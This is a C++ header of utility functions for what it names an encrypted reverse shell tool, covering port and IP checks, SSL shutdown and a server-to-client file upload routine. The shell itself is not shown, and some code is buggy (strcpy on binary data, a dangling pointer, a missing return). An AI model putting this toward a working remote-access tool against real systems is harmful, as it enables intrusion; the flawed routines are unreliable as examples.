#ifndef ENCRYPTED_REV_SHELL_UTILS_H
#define ENCRYPTED_REV_SHELL_UTILS_H

#include <algorithm>
#include <cmath>
#include <complex>
#include <cstring>
#include <iostream>
#include <fstream>

#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <pty.h>
#include <openssl/ssl.h>
#include <openssl/err.h>



inline char* toLower(char* arg) {

    //convert to string
    std::string inputStr = arg;

    // loop through and covert to lower char
    std::transform(inputStr.begin(), inputStr.end(), inputStr.begin(),
    [](unsigned char c){ return std::tolower(c); });

    //convert back to char array
    char* returnChar = new char[inputStr.length() + 1];
    strcpy(returnChar, inputStr.c_str());

    return returnChar;
}


inline bool isPort(char* arg) {
    std::string inputStr = arg;

    if ( std::all_of(inputStr.begin(), inputStr.end(),
                     [](unsigned char c) { return std::isdigit(c); })) {
        int inputNum = std::stoi(inputStr);

        if ( inputNum >= 1 && inputNum <= 65535) {
            return true;
        }
        else {
            return false;
        }
    }
    return false;

}

inline bool checkIfIpAddr(char* arg) {
    unsigned char buf[sizeof(struct in_addr)];

    int check = inet_pton(AF_INET, arg, buf);

    if (check <= 0) {
        return false;
    }
    else {
        return true;
    }
}

inline void safeShutdown(const std::string& msgToSnd, const int socket, const int socket_fd, SSL* ssl,  SSL_CTX* ctx) {
    std::cout << msgToSnd << std::endl;
    const char *message = msgToSnd.c_str();
    send(socket, message, strlen(message), 0);
    close(socket);
    close(socket_fd);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    exit(EXIT_FAILURE);
}
// example server fileToUpload (ttyBuffer), pathToUploadTo
inline char* uploadFile(const std::string& clientOrServer, const char* fileToUpload, const std::string& pathToUploadTo) {

    if (clientOrServer == "server") {
        std::ifstream inputFile(fileToUpload, std::ios::binary | std::ios::ate);

        if (!inputFile) {
            std::cout << "[!] Error opening file " << fileToUpload << std::endl;
            return nullptr;
        }

        std::streamsize fileSize = inputFile.tellg();
        inputFile.seekg(0, std::ios::beg);

        char* fileBuffer = new char[fileSize];

        if (!inputFile.read(fileBuffer, fileSize)) {
            std::cout << "[!] Error reading file " << fileToUpload << std::endl;
            return nullptr;
        }

        inputFile.close();

        char* returnChar = new char[fileSize];

        strcpy(returnChar, fileBuffer);

        return returnChar;
    }
    else if (clientOrServer == "client") {

        // need to parse incoming buffer at fileToUpload
        // theoretically it will contain the string "upload\n" everything after will be the file.
        ssize_t uploadStrSize = sizeof("upload\n") - 1;

        std::string tmpStr (fileToUpload);
        tmpStr = tmpStr.substr(uploadStrSize);

        fileToUpload = tmpStr.c_str();

        std::ofstream outputFile((pathToUploadTo), std::ios::binary | std::ios::ate);

        outputFile.write(fileToUpload, strlen(fileToUpload));
    }
}

#endif //ENCRYPTED_REV_SHELL_UTILS_H